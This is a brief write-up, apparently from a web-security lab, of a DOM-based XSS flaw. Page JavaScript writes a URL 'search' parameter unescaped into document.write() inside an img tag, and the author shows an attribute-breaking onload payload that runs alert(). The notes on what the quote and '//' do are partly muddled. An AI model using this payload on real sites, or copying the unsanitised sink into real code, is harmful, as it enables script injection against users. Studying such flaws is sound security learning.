The JS of the webpage below:
```
                    <script>
                        function trackSearch(query) {
                            document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
                        }
                        var query = (new URLSearchParams(window.location.search)).get('search');
                        if(query) {
                            trackSearch(query);
                        }
                    </script>
```

To exploit this, my payload is:
```
    '" onload="alert()">//
```
- `'"` is to close the string of `document.write()`.
- `onload` is loading the JS code when the page is loaded.
- `>` close the `<img>` tag.
- `//` is to comment the remaining character in the `document.write()` line. In this case is `>//`.
